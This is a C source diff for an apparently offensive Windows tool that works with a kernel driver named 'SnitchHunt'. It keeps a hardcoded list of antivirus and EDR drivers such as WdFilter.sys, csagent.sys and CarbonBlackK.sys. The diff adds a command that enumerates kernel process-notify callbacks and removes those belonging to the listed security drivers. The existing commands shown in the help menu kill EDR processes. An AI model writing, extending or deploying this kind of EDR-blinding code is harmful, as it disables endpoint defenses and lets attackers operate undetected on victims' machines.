@@ -67,7 +67,7 @@ const char* monitoredDrivers[] = {
     "EX64.sys", "Eng64.sys", "teefer2.sys", "teefer3.sys", "srtsp64.sys",
     "srtspx64.sys", "srtspl64.sys", "Ironx64.sys", "fekern.sys", "cbk7.sys",
     "WdFilter.sys", "cbstream.sys", "atrsdfw.sys", "avgtpx86.sys",
-    "avgtpx64.sys", "naswSP.sys", "edrsensor.sys", "CarbonBlackK.sys",
+    "avgtpx64.sys", "naswSP.sys", "ProcessSnitch.sys", "edrsensor.sys", "CarbonBlackK.sys",
     "parity.sys", "csacentr.sys", "csaenh.sys", "csareg.sys", "csascr.sys",
     "csaav.sys", "csaam.sys", "rvsavd.sys", "cfrmd.sys", "cmdccav.sys",
     "cmdguard.sys", "CmdMnEfs.sys", "MyDLPMF.sys", "im.sys", "csagent.sys",
@@ -85,7 +85,7 @@ const char* monitoredDrivers[] = {
     "SymHsm.sys", "evmf.sys", "GEFCMP.sys", "VFSEnc.sys", "pgpfs.sys",
     "fencry.sys", "symrg.sys", "ndgdmk.sys", "ssfmonm.sys", "SISIPSFileFilter.sys",
     "cyverak.sys", "cyvrfsfd.sys", "cyvrmtgn.sys", "tdevflt.sys", "tedrdrv.sys",
-    "tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
+	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
 };
 
 
@@ -249,12 +249,80 @@ BOOL ListProcNotifyRoutine(HANDLE hDevice) {
     return result;
 }
 
+BOOL ElProcCallback(HANDLE hDevice) {
+    DWORD bytesReturned;
+    ModulesData* resultArray = NULL;
+    ULONG64 modulesCount = 0;
+    BOOL result;
+
+
+
+    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);
+
+    result = DeviceIoControl(
+        hDevice,
+		IOCTL_LIST_PROC_CALLBACK,
+        NULL,
+        0,
+        resultArray,
+        sizeof(ModulesData) * 64,
+        &bytesReturned,
+        NULL
+    );
+    if (resultArray == NULL) {
+        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
+        free(resultArray);
+        return FALSE;
+    }
+    if (bytesReturned == 0) {
+        fprintf(stderr, "No data returned from driver.\n");
+        free(resultArray);
+        return FALSE;
+    }
+    for (size_t i = 0; i < 64; i++) {
+        if (resultArray[i].ModuleBase == 0)
+            break;
+		// Check if the module is in the monitored drivers list 104 is a temp number of the elements of the array
+        for (size_t j = 0; j < 104; j++) {
+            if (_stricmp(resultArray[i].ModuleName, monitoredDrivers[j]) == 0) {
+                printf("Removing Process Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
+                DWORD bytesReturnedRem;
+                BOOL remResult = DeviceIoControl(
+                    hDevice,
+                    IOCTL_REM_PROC_CALLBACK,
+                    &resultArray[i].ModuleName,
+                    sizeof(resultArray[i].ModuleName),
+                    NULL,
+                    0,
+                    &bytesReturnedRem,
+                    NULL
+                );
+                if (remResult) {
+                    printf("Successfully removed callback for %s\n", resultArray[i].ModuleName);
+                }
+                else {
+                    fprintf(stderr, "Failed to remove callback for %s. Error: %lu\n", resultArray[i].ModuleName, GetLastError());
+                }
+            }
+		}
+        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
+    }
+    if (!result) {
+        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
+    }
+    else {
+        printf("Successfully sent request to remove process notify routine callback.\n");
+	}
+
+    return result;
+}
+
+
 
 
 
 int main(int argc, char* argv[])
 {
-
     HANDLE hDevice = CreateFileA(
         "\\\\.\\SnitchHunt",                // Device name
         GENERIC_READ | GENERIC_WRITE,      // Desired access
@@ -307,12 +375,22 @@ int main(int argc, char* argv[])
                 printf("Failed to send crash command. Error: %lu\n", GetLastError());
             }
 		}
+		else if (strncmp(input, "elproccallback", 14) == 0) {
+			BOOL result = ElProcCallback(hDevice);
+		    if (result) {
+                printf("Sent request to eliminate process notify routine callback.\n");
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+			}
+        }
         else if (strncmp(input, "help", 4) == 0) {
 			printf("Help menu:\n");
 			printf(" - terminate        - Start killing EDR processes\n");
 			printf(" - kill <PID>       - Kill a specific process by PID\n");
 			printf(" - exit             - Exit the program\n");
 			printf(" - stopterm         - Stop killing EDR processes\n");
+			printf(" - elproccallback   - Eliminate process notify routine callback\n");
 			printf(" - listproc         - List process notify routines\n");
 			printf(" - help             - Show this help menu\n");
         }
@@ -320,8 +398,5 @@ int main(int argc, char* argv[])
             printf("Unknown command. Available commands: kill, exit\n");
 		}
     }
-
-
-
 	return 0;
 }
